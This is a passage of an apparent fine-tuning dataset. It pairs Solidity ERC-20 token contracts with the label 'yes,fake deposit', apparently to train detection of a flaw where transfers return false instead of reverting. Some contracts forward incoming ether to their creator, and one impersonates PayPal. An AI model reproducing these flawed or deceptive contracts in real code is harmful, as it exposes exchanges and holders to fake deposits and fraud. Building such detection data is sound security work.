(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n\n balances[_to] += _value;\n\n balances[_from] -= _value;\n\n allowed[_from][msg.sender] -= _value;\n\n Transfer(_from, _to, _value);\n\n return true;\n\n } else { return false; }\n\n }\n\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n\n return balances[_owner];\n\n }\n\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n\n Approval(msg.sender, _spender, _value);\n\n return true;\n\n }\n\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n\n return allowed[_owner][_spender];\n\n }\n\n\n mapping (address => uint256) balances;\n\n mapping (address => mapping (address => uint256)) allowed;\n\n uint256 public totalSupply;\n\n}\n\n\n//name this contract whatever you'd like\n\ncontract HAZARDToken is StandardToken {\n\n\n function () {\n\n //if ether is sent to this address, send it back.\n\n throw;\n\n }\n\n\n \n\n\n \n\n string public name; //fancy name: eg Simon Bucks\n\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n\n string public symbol; //An identifier: eg SBX\n\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n\n\n function HAZARDToken(\n\n ) {\n\n balances[msg.sender] = 100000000000000; // Give the creator all initial tokens (100000 for example)\n\n totalSupply = 100000000000000; // Update total supply (100000 for example)\n\n name = \"HAZARD\"; // Set the name for display purposes\n\n decimals = 8; // Amount of decimals for display purposes\n\n symbol = \"HAZARD\"; // Set the symbol for display purposes\n\n }\n\n\n \n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n\n Approval(msg.sender, _spender, _value);\n\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n\n return true;\n\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'BurgerandFries' token contract\n//\n// Symbol : BF \ud83c\udf54\ud83c\udf5f\n// Name : Burger and Fries\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract BurgerandFries is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Burger and Fries\";\n string public constant symbol = \"BF \ud83c\udf54\ud83c\udf5f\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SkyMomoInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Sky Momo Inu\";\n string public constant symbol = \"SMOMO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'FlokiBone' token contract\n//\n// Symbol : FBONE \ud83c\udf56\n// Name : Floki Bone\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FlokiBone is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Floki Bone\";\n string public constant symbol = \"FBONE \ud83c\udf56\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 20000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 20000000000000000; // Update total supply (100000 for example)\n name = \"CARBON\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"CRB\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract VGPrime is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract PayPal_Official_Token is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"PayPal\";\n string public constant symbol = \"PAYPAL\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STSToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"STARFISH\";\n string constant public symbol = \"STS\";\n\n function STSToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract SafeRune {\n string public name = 'Safu Rune';\n uint8 public decimals = 18;\n string public symbol = 'SafuRune';\n string public version = '1.0';\n uint256 public totalSupply = 0;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function approve(address _spender, uint256 _value ) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function RedeemErc20Rune(uint256 amount) public {\n if(!erc20RuneContract.transfer(msg.sender, amount)) revert();\n balances[msg.sender] -= amount;\n totalSupply -= amount;\n emit Transfer(msg.sender, address(this), amount);\n }\n\n function MintSafeRune(uint256 amount) public {\n // transferTo always returns true so theres no reason to check the return value. Reverts on fail\n erc20RuneContract.transferTo(address(this), amount);\n balances[msg.sender] += amount;\n totalSupply += amount;\n emit Transfer(address(this), msg.sender, amount);\n }\n}\n\ninterface Erc20Rune {\n function transferTo(address recipient, uint256 amount) external returns (bool);\n function transfer(address _to, uint256 _value) external returns (bool success);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract dFund is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000*10**uint256(decimals);\n string public constant name = \"dFund\";\n string public constant symbol = \"DFND\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ColossalShibaInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Colossal Shiba Inu\";\n string public constant symbol = \"COLINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n \n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, 